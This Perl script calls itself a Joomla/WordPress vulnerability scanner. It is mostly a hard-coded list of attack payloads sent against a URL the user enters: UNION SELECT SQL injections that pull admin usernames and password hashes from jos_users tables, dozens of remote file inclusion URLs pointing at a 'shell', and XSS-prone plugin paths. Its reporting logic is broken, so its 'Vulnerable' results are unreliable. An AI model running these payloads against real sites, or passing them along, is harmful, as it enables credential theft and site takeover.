#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Std;
system("CLS");
system("title -==[[ WebApps Scanner by Fahmi Fisal ]]==-");

use Digest::MD5;
use MIME::Base64;
use HTTP::Request;
use LWP::UserAgent;
use LWP::Simple;

menu:
$sis="$^O";if ($sis eq linux){ $cmd="clear";} else { $cmd="cls"; }
system("$cmd");

print "\=============================< WebApp VSPT Tool >==============================\n";
print "\||  	                                                                     ||\n";
print "\||    Web Application Vulnerability Scanning & Penetration Testing Tool      ||\n";
print "\||                                                                           ||\n";
print "\===============================================================================\n";
print "\t     \n";
print "\t     \n";

			print "\	========================================================\n";
			print "\	+ 1) SQLi Vulnerable Scanner Joomla & Wordpress +\n";
			print "\	+ 2) Vulnerability Scanning XSS (Cross Site Scripting +\n";
			print "\	 * Enter for exit	\n";
			print "\	========================================================\n";
			print "\n Press the number that particular sevice labelled: ";
			$gay=<STDIN>;
			chomp $gay;
			if ($gay==1){&SQLI}
			if ($gay==2){&XSS}
			
sub SQLI {
use LWP::UserAgent;
use HTTP::Request;
regex();
header();
print "\n \n";
print "\	    ========================================================\n";
print "\	    + Enter targeted URL.                                  +\n";
print "\	    + Example: http://www.site.com/                        +\n";
print "\	    ========================================================\n";
print "\n Enter your desired URL: ";            
chomp($link = <STDIN>);
if($link !~ /http:\/\//) { $link = "http://$link"; }
print "\n ->>>> Please enter to check version httpd[...] \n";
$httpd =<STDIN>;
$host = $link;
$useragent = LWP::UserAgent->new;
$resp = $useragent->head($host);
print $resp->headers_as_string;
print "\n ->>>> Enter to start searching vulnerability on Joomla & Wordpress CMS[...] \n";
$start =<STDIN>;
                    
#scanning 108 paths
@vuls = ("index.php?option=com_hwdvideoshare&func=viewcategory&Itemid=61&cat_id=-9999999/**/union/**/select/**/000,111,222,username,password,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,2/**/from/**/jos_users/*", #01
      "index.php?option=com_clasifier&Itemid=61&cat_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*", #02
      "index.php?option=com_pccookbook&page=viewuserrecipes&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*", #03
      "administrator/components/com_astatspro/refer.php?id=-1/**/union/**/select/**/0,concat(username,0x3a,password,0x3a,usertype),concat(username,0x3a,password,0x3a,usertype)/**/from/**/jos_users/*", #04
      "index.php?option=com_galeria&Itemid=61&func=detail&id=-999999/**/union/**/select/**/0,0,password,111,222,333,0,0,0,0,0,1,1,1,1,1,1,444,555,666,username/**/from/**/users/*", #05
      "index.php?option=com_jooget&Itemid=61&task=detail&id=-1/**/union/**/select/**/0,333,0x3a,333,222,222,222,111,111,111,0,0,0,0,0,0,0,0,1,1,2,2,concat(username,0x3a,password)/**/from/**/jos_users/*", #06
      "index.php?option=com_quiz&task=user_tst_shw&Itemid=61&tid=1/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0x3a,password)/**/from/**/jos_users/*", #07
      "index.php?option=com_paxxgallery&Itemid=85&gid=7&userid=2&task=view&iid=-3333%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2C1%2C2%2C3%2Cconcat(username,0x3a,password)%2F%2A%2A%2Ffrom%2F%2A%2A%2Fjos_users", #08
      "index.php?option=com_xfaq&task=answer&Itemid=42&catid=97&aid=-9988%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),0x3a,password,0x3a,username,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0/**/from/**/jos_users/*", #09
      "index.php?option=com_pcchess&Itemid=61&page=players&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*", #10
      "index.php?option=com_neogallery&task=show&Itemid=5&catid=999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),concat(username,0x3a,password),concat(username,0x3a,password)/**/from%2F%2A%2A%2Fjos_users", #11
      "index.php?option=com_noticias&Itemid=xcorpitx&task=detalhe&id=-99887766/**/union/**/%20select/**/0,concat(username,0x3a,password,0x3a,email),2,3,4,5/**/%20from/**/%20jos_users/*", #12
      "index.php?option=com_doc&task=view&sid=-1/**/union/**/select/**/concat(username,0x3a,password),1,2,concat(username,0x3a,password),0x3a,5,6,7,8,password,username,11/**/from/**/jos_users/", #13
      "index.php?option=com_marketplace&page=show_category&catid=-1+union+select+concat(username,0x3a,password),2,3+from+jos_users/*", #14
      "index.php?option=com_directory&page=viewcat&catid=-1/**/union/**/select/**/0,concat(username,0x3a,password)/**/from/**/jos_users/*",  #15
      "index.php?option=com_neoreferences&Itemid=27&catid=99887766/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/jos_users/*%20where%20user_id=1=1/*", #16
      "index.php?option=com_puarcade&Itemid=92&fid=-1%20union%20select%20concat(username,0x3a,password)%20from%20jos_users--", #17
      "index.php?option=com_rsgallery&page=inline&catid=-1%20union%20select%201,2,3,4,concat(username,0x3a,password),6,7,8,9,10,11%20from%20mos_users--", #18
      "index.php?option=com_eventlist&func=details&did=9999999999999%20union%20select%200,0,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),4,5,6,7,8,9,00,0,444,555,0,777,0,999,0,0,0,0,0,0,0%20from%20jos_users/*", #19
      "index.php?option=com_nicetalk&tagid=-2)%20union%20select%201,2,3,4,5,6,7,8,0,999,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),777,666,555,444,333,222,111%20from%20jos_users/*", #20
      "index.php?option=com_neorecruit&task=offer_view&id=option=com_neorecruit&task=offer_view&id=99999999999%20union%20select%201,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),3,4,5,6,7,8,111,222,333,444,0,0,0,555,666,777,888,1,2,3,4,5,0%20from%20jos_users/*", #21
      "index.php?option=com_gmaps&task=viewmap&Itemid=57&mapId=-1/**/union/**/select/**/0,username,password,3,4,5,6,7,8/**/from/**/jos_users/*", #22
      "index.php?option=com_ponygallery&Itemid=x&func=viewcategory&catid=%20union%20select%201,2,3,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),5,0,0%20from%20jos_users/*", #23
      "index.php?option=com_rwcards&task=listCards&category_id=-1'union%20select%201,2,03,4,concat(char(117,115,101,114,110,97,109,101,58),username,char(112,97,115,115,119,111,114,100,58),password),50,044,076,0678,07%20from%20jos_users/*", #24
      "index.php?option=com_resman&task=moreinfo&id=-1%20union%20select%20111,concat(char(117,115,101,114,110,97,109,101,58),username,char(112,97,115,115,119,111,114,100,58),password),333%20from%20jos_users/*", #25
      "components/com_flyspray/startdown.php:startdown.php?file=shell", #26
      "administrator/components/com_admin/admin.admin.html.php:admin.admin.html.php?mosConfig_absolute_path=shell", #27
      "components/com_simpleboard/file_upload.php:file_upload.php?sbp=shell", #28
      "components/com_hashcash/server.php:server.php?mosConfig_absolute_path=shell", #29
      "components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php:config.inc.php?mosConfig_absolute_path=shell",  #30
      "components/com_sitemap/sitemap.xml.php:sitemap.xml.php?mosConfig_absolute_path=shell ", #31
      "components/com_performs/performs.php:performs.php?mosConfig_absolute_path=shell",  #32
      "components/com_forum/download.php:download.php?phpbb_root_path=shell", #33
      "components/com_pccookbook/pccookbook.php:pccookbook.php?mosConfig_absolute_path=shell", #34
      "components/com_extcalendar/extcalendar.php:extcalendar.php?mosConfig_absolute_path=shell", #35
      "components/minibb/index.php:index.php?absolute_path=shell", #36
      "components/com_smf/smf.php:smf.php?mosConfig_absolute_path=", #37
      "modules/mod_calendar.php:mod_calendar.php?absolute_path=shell ", #38
      "components/com_pollxt/conf.pollxt.php:conf.pollxt.php?mosConfig_absolute_path=shell ", #39
      "components/com_loudmounth/includes/abbc/abbc.class.php:abbc.class.php?mosConfig_absolute_path=shell", #40
      "components/com_videodb/core/videodb.class.xml.php:videodb.class.xml.php?mosConfig_absolute_path=shell", #41
      "components/com_pcchess/include.pcchess.php:include.pcchess.php?mosConfig_absolute_path=shell", #42
      "administrator/components/com_multibanners/extadminmenus.class.php:extadminmenus.class.php?mosConfig_absolute_path=shell", #43
      "administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php:admin.a6mambohelpdesk.php?mosConfig_live_site=shell", #44
      "administrator/components/com_colophon/admin.colophon.phpv:admin.colophon.php?mosConfig_absolute_path=shell", #45
      "administrator/components/com_mgm/help.mgm.php:help.mgm.php?mosConfig_absolute_path=shell", #46
      "components/com_mambatstaff/mambatstaff.php:mambatstaff.php?mosConfig_absolute_path=shell", #47
      "components/com_securityimages/configinsert.php:configinsert.php?mosConfig_absolute_path=shell", #48
      "components/com_securityimages/lang.php:lang.php?mosConfig_absolute_path=shell", #49
      "components/com_artlinks/artlinks.dispnew.php:artlinks.dispnew.php?mosConfig_absolute_path=shell", #50
      "components/com_galleria/galleria.html.php:galleria.html.php?mosConfig_absolute_path=shell", #51
      "akocomments.php:akocomments.php?mosConfig_absolute_path=shell",  #52
      "administrator/components/com_cropimage/admin.cropcanvas.php:admin.cropcanvas.php?cropimagedir=shell", #53
      "administrator/components/com_kochsuite/config.kochsuite.php:config.kochsuite.php?mosConfig_absolute_path=shell", #54
      "administrator/components/com_comprofiler/plugin.class.php:plugin.class.php?mosConfig_absolute_path=shell", #55
      "components/com_zoom/classes/fs_unix.php:fs_unix.php?mosConfig_absolute_path=shell", #56
      "components/com_zoom/includes/database.php:database.php?mosConfig_absolute_path=shell", #57
      "administrator/components/com_serverstat/install.serverstat.php:install.serverstat.php?mosConfig_absolute_path=shell", #58
      "components/com_fm/fm.install.php:fm.install.php?lm_absolute_path=shell", #59
      "administrator/components/com_mambelfish/mambelfish.class.php:mambelfish.class.php?mosConfig_absolute_path=shell", #60
      "components/com_lmo/lmo.php:lmo.php?mosConfig_absolute_path=shell", #61
      "administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php:toolbar.linkdirectory.html.php?mosConfig_absolute_ path=shell",#62
      "components/com_mtree/Savant2/Savant2_Plugin_****area.php:Savant2_Plugin_****area.php?mosConfig_absolute_path=shell",#63
      "administrator/components/com_jim/install.jim.php:install.jim.php?mosConfig_absolute_path=shell",#64
      "administrator/components/com_webring/admin.webring.docs.php:admin.webring.docs.php?component_dir=shell",#65
      "administrator/components/com_remository/admin.remository.php:admin.remository.php?mosConfig_absolute_path=shell",#66
      "administrator/components/com_babackup/classes/Tar.php:Tar.php?mosConfig_absolute_path=shell", #67
      "administrator/components/com_lurm_constructor/admin.lurm_constructor.php:admin.lurm_constructor.php?lm_absolute_path=shell",#68
      "components/com_mambowiki/MamboLogin.php:MamboLogin.php?IP=shell",#69
      "administrator/components/com_a6mambocredits/admin.a6mambocredits.php:admin.a6mambocredits.php?mosConfig_live_site=shell",#70
      "administrator/components/com_phpshop/toolbar.phpshop.html.php:toolbar.phpshop.html.php?mosConfig_absolute_path=shell",#71
      "components/com_cpg/cpg.php:cpg.php?mosConfig_absolute_path=shell",#72
      "components/com_moodle/moodle.php:moodle.php?mosConfig_absolute_path=shell ",#73
      "components/com_extended_registration/registration_detailed.inc.php:registration_detailed.inc.php?mosConfig_absolute_path=shell",#74
      "components/com_mospray/scripts/admin.php:admin.php?basedir=shell",#75
      "administrator/components/com_bayesiannaivefilter/lang.php:lang.php?mosConfig_absolute_path=shell",#76
      "administrator/components/com_uhp/uhp_config.php:uhp_config.php?mosConfig_absolute_path=shell",#77
      "administrator/components/com_peoplebook/param.peoplebook.php:param.peoplebook.php?mosConfig_absolute_path=shell",#78
      "administrator/components/com_mmp/help.mmp.php:help.mmp.php?mosConfig_absolute_path=shell",#79
      "components/com_reporter/processor/reporter.sql.php:reporter.sql.php?mosConfig_absolute_path=shell",#80
      "components/com_madeira/img.php:img.php?url=shell",#81
      "components/com_jd-wiki/lib/tpl/default/main.php:main.php?mosConfig_absolute_path=shell", #82
      "components/com_bsq_sitestats/external/rssfeed.php:rssfeed.php?baseDir=shell", #83
      "com_bsq_sitestats/external/rssfeed.php:rssfeed.php?baseDir=shell",  #84
      "components/com_slideshow/admin.slideshow1.php:admin.slideshow1.php?mosConfig_live_site=shell", #85
      "administrator/components/com_panoramic/admin.panoramic.php:admin.panoramic.php?mosConfig_live_site=shell", #86
      "administrator/components/com_mosmedia/includes/credits.html.php:credits.html.php?mosConfig_absolute_path=shell",  #87
      "administrator/components/com_mosmedia/includes/info.html.php:info.html.php?mosConfig_absolute_path=shell", #88
      "administrator/components/com_mosmedia/includes/media.divs.php:media.divs.php?mosConfig_absolute_path=shell", #89
      "administrator/components/com_mosmedia/includes/media.divs.**.php:media.divs.**.php?mosConfig_absolute_path=shell", #90
      "administrator/components/com_mosmedia/includes/purchase.html.php:purchase.html.php?mosConfig_absolute_path=shell",#91
      "administrator/components/com_mosmedia/includes/support.html.php:support.html.php?mosConfig_absolute_path=shell",#92
      "administrator/components/com_wmtportfolio/admin.wmtportfolio.php:admin.wmtportfolio.php?mosConfig_absolute_path=shell",#93
      "components/com_mp3_allopass/allopass.php:components/com_mp3_allopass/allopass.php?mosConfig_live_site=shell",#94
      "components/com_mp3_allopass/allopass-error.php:components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=shell",#95
      "administrator/components/com_jcs/jcs.function.php:administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=shell",#96
      "administrator/components/com_jcs/view/add.php:administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=shell",#97
      "administrator/components/com_jcs/view/history.php:administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=shell",#98
      "administrator/components/com_jcs/view/register.php:administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=shell",#99
      "administrator/components/com_jcs/views/list.sub.html.php:administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=shell",#100
      "administrator/components/com_jcs/views/list.user.sub.html.php:administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=shell",#101
      "administrator/components/com_jcs/views/reports.html.php:administrator/components/com_jcs/views/reports.html.php?mosConfig_absolute_path=shell",#102
      "com_joomla_flash_uploader/install.joomla_flash_uploader.php:com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=shell",#103
      "com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php:com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=shell",#104
      "administrator/components/com_jjgallery/admin.jjgallery.php:administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=shell",#105
      "administrator/components/com_juser/xajax_functions.php:administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=shell",#106
      "components/com_jreviews/scripts/xajax.inc.php:components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=shell",#107
      "com_directory/modules/mod_pxt_latest.php:com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=shell",#108
	  "index.php?option=com_docmanpaypal&task=file&id=4", #109
	  "index.php?option=com_hbooking&view=room&layout=services&sid=21", #110
	  "index.php?option=com_jedirectory&view=cat_parent&catparent=1", #111
	  "?option=com_rsfiles&view=files&layout=agreement&tmpl=component&cid=1", #112
	  "index.php?option=com_lms&controller=statedetail&id=", #113
	  "index.php?option=com_custompages&cpage=member_details.php&id=", #114
	  "index.php?option=com_smartshop&controller=smartshop_products&task=details&parentid=", #115
	  "index.php?option=com_spidercalendar&Itemid=14&date=", #116
	  "index.php?option=com_spidercatalog&product_id=", #117
	  "index.php?option=com_quiz&task=user_tst_shw&Itemid=", #118
	  "?option=com_jooproperty&view=booking&layout=modal&product_id=", #119
	  "wp-content/plugins/newsletter/do/view.php?id=99",#120
	  "wp-admin/admin.php?page=wysija_campaigns&orderby=1",#121
	  "wp-content/plugins/googlealertandtwitter/add_emails.php?action=edit&EID=1");#122)
	  #end paths
                    
                     @pages = ("joomla[01]", "joomla[02]", "joomla[03]", 
                               "joomla[04]", "joomla[05]", "joomla[06]", 
                               "joomla[07]", "joomla[08]", "joomla[09]", 
                               "joomla[10]", "joomla[11]", "joomla[12]", 
                               "joomla[13]", "joomla[14]", "joomla[15]", 
                               "joomla[16]", "joomla[17]", "joomla[18]", 
                               "joomla[19]", "joomla[20]", "joomla[21]", 
                               "joomla[22]", "joomla[23]", "joomla[24]", 
                               "joomla[25]", "joomla[26]", "joomla[27]", 
                               "joomla[28]", "joomla[29]", "joomla[30]", 
                               "joomla[31]", "joomla[32]", "joomla[33]", "joomla[34]", 
                               "joomla[35]", "joomla[36]", "joomla[37]", 
                               "joomla[38]", "joomla[39]", "joomla[40]", 
                               "joomla[41]", "joomla[42]", "joomla[43]", 
                               "joomla[44]", "joomla[45]", "joomla[46]", 
                               "joomla[47]", "joomla[48]", "joomla[49]", "joomla[50]", 
                               "joomla[51]", "joomla[52]", "joomla[53]", 
                               "joomla[54]", "joomla[55]", "joomla[56]", 
                               "joomla[57]", "joomla[58]", "joomla[59]", 
                               "joomla[60]", "joomla[61]", "joomla[62]", 
                               "joomla[63]", "joomla[64]", "joomla[65]", 
                               "joomla[66]", "joomla[67]", "joomla[68]", 
                               "joomla[69]", "joomla[70]", "joomla[71]",  
                               "joomla[72]", "joomla[73]", "joomla[74]", 
                               "joomla[75]", "joomla[76]", "joomla[77]", 
                               "joomla[78]", "joomla[79]", "joomla[80]", 
                               "joomla[81]", "joomla[82]", "joomla[83]", 
                               "joomla[84]", "joomla[85]", "joomla[86]", 
                               "joomla[87]", "joomla[88]", "joomla[89]", 
                               "joomla[90]", "joomla[91]", "joomla[92]",
                               "joomla[93]", "joomla[94]", "joomla[95]", 
                               "joomla[96]", "joomla[97]", "joomla[98]", 
                               "joomla[99]", "joomla[100]", "joomla[101]",
                               "joomla[102]", "joomla[103]", "joomla[104]", 
                               "joomla[105]", "joomla[106]", "joomla[107]",
							   "joomla[108]", "joomla[109]",  "joomla[110]", "joomla[111]",
							   "joomla[112]", "joomla[113]", "joomla[114]",  "joomla[115]",
                               "joomla[116]", "joomla[117]", "joomla[118]", "joomla[119]", "wordpress[120]", "wordpress[121]",
							   "wordpress[122]");
                               print " ->>>> Start scanning[...] \n\n";
                               foreach $scan(@vuls){
                               $url = "$link/$scan";
                               $request = HTTP::Request->new(GET=>$url);
                               $useragent = LWP::UserAgent->new();
                               $response = $useragent->request($request);
                               if ($response->is_success){ $msg = Vulnerable;}
                               else { $msg = "Not Found";}

}
                               foreach $print (@pages){
                               print "$print......[$msg]\n";
                               }
                               sub regex(){
                               $sis="$^O";if ($sis eq windows){ $cmd="clear";} else { $cmd="cls"; }
                               system("$cmd");
                               }
                               sub header(){
                               print };
			       print "\n Press ENTER to return to main menu. \n";
			       <STDIN>;
			       goto menu;
			       }

sub XSS {
use LWP::UserAgent;
use HTTP::Request;
regex();
header();
print "\n \n";
print "\	    ========================================================\n";
print "\	    + Enter targeted URL.                                  +\n";
print "\	    + Example: http://www.site.com/                        +\n";
print "\	    ========================================================\n";
print "\n Enter your desired URL: ";            
chomp($link = <STDIN>);
if($link !~ /http:\/\//) { $link = "http://$link"; }
print "\n ->>>> Please enter to check version httpd[...] \n";
$httpd =<STDIN>;
$host = $link;
$useragent = LWP::UserAgent->new;
$resp = $useragent->head($host);
print $resp->headers_as_string;
print "\n ->>>> Enter to start searching vulnerability on Joomla & Wordpress CMS[...] \n";
$start =<STDIN>;
                    
#scanning 108 paths
@vuls = ("administratorcomponents/com_wordpress/path/wp-includes/js/swfupload/swfupload.swf?buttonText=", #01
      "administrator/components/com_incapsula/assets/tips/en/Security.php?token=", #02
      "index.php/component/aclassif/?'", #03
      "components/com_wordpress/wp/wp-includes/js/swfupload/swfupload.swf?buttonText=", #04
      "components/com_preachit/assets/swfupload/swfupload.swf?buttonText=", #05
      "index.php?option=com_quiz&task=user_tst_shw&Itemid=", #06
	  "wp-content/plugins/1-flash-gallery/swf/ZeroClipboard.swf?id=", #107
	  "wp-content/plugins/slidedeck2/js/zeroclipboard/ZeroClipboard.swf?id=", #108
	  "wp-content/plugins/wpclone/lib/js/ZeroClipboard.swf?i?id=", #109
	  "wp-content/plugins/paypal-digital-goods-monetization-powered-by-cleeng/js/ZeroClipboard.swf?id=", #110
	  "wp-content/plugins/cleeng/js/ZeroClipboard.swf?id=", #111
	  "wp-content/plugins/kioskprox/app/mail/index.php?id=", #112
	  "wp-content/plugins/fbsurveypro/timeline/index.php?id=", #113
	  "wp-content/plugins/timelineoptinpro/timeline/index.php?id=", #114
	  "wp-content/plugins/wp-video-commando/magic-code1.php?bid=", #115
	  "wp-content/themes/felici/sprites/js/uploadify/uploadify.swf?buttonText=", #116
	  "wp-admin/admin.php?page=sp-add",#117
	  "wp-content/plugins/wp-image-news-slider/js/swfupload/js/swfupload.swf?buttonText=",#118
	  "wp-content/plugins/bp-gallery/inc/js/swfupload/swfupload.swf?buttonText=", #119
	  "wp-content/plugins/o2s-gallery/js/SWFUpload/Flash/swfupload.swf?buttonText=", #120
	  "wp-content/plugins/googlealertandtwitter/activation.php?msg=");#121)
	  #end paths
                    
                     @pages = ("joomla[01]", "joomla[02]", "joomla[03]", 
                               "joomla[04]", "joomla[05]", "joomla[06]", 
                               "wordpress[07]", "wordpress[08]", "wordpress[09]", 
                               "wordpress[10]", "wordpress[11]", "wordpress[12]", 
                               "wordpress[13]", "wordpress[14]", "wordpress[15]", 
                               "wordpress[16]", "wordpress[17]", "wordpress[18]", 
                               "wordpress[19]", "wordpress[20]", "wordpress[21]");
                               print " ->>>> Start scanning[...] \n\n";
                               foreach $scan(@vuls){
                               $url = "$link/$scan";
                               $request = HTTP::Request->new(GET=>$url);
                               $useragent = LWP::UserAgent->new();
                               $response = $useragent->request($request);
                               if ($response->is_success){ $msg = Vulnerable;}
                               else { $msg = "Not Found";}

}
                               foreach $print (@pages){
                               print "$print......[$msg]\n";
                               }
                               sub regex(){
                               $sis="$^O";if ($sis eq windows){ $cmd="clear";} else { $cmd="cls"; }
                               system("$cmd");
                               }
                               sub header(){
                               print };
			       print "\n Press ENTER to return to main menu. \n";
			       <STDIN>;
			       goto menu;
			       }
